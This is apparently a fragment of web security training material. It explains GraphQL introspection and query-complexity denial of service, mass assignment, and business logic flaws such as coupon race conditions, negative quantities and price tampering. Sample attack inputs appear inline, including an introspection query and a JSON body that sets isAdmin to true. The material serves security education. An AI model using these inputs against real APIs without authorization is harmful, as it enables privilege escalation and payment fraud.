<p>A REST API exposes many narrow endpoints, so testing means enumerating routes and methods. A GraphQL API exposes one endpoint but a large, often introspectable schema — querying <code>{__schema{types{name,fields{name}}}}</code> against an API with introspection left enabled hands an attacker the entire data model, including fields and mutations never shown in the UI. GraphQL also introduces its own flaw class: deeply nested or batched queries that cost the server far more than a rate limiter counting "one request" accounts for (a denial-of-service via query complexity, not request volume).</p>
<h4>Mass assignment</h4>
<p>If an API endpoint blindly maps a JSON body onto a database model (<code>User.update(request.body)</code>), an attacker can add fields the UI never exposes — <code>{"username":"bob","isAdmin":true}</code> — and the extra field is silently accepted if the backend doesn't explicitly allowlist which fields a given request is permitted to set. This is common in frameworks that offer convenient auto-binding by default.</p>
<h4>Business logic flaws, by example</h4>
<ul><li><b>Race condition on a coupon:</b> sending the same "redeem coupon" request 20 times in parallel before the first one commits can apply a single-use discount 20 times, because the check-then-act isn't atomic.</li><li><b>Negative quantity:</b> a checkout API that accepts <code>{"quantity": -5}</code> and computes <code>price * quantity</code> can turn a purchase into a refund.</li><li><b>Price tampering:</b> a client-sent price field that the server trusts instead of re-deriving from the product catalogue.</li></ul>
<p>None of these trigger a scanner signature — they require reading what the application is <i>supposed</i> to do and asking what happens at the edges of that logic.</p>
`},
  ]
},
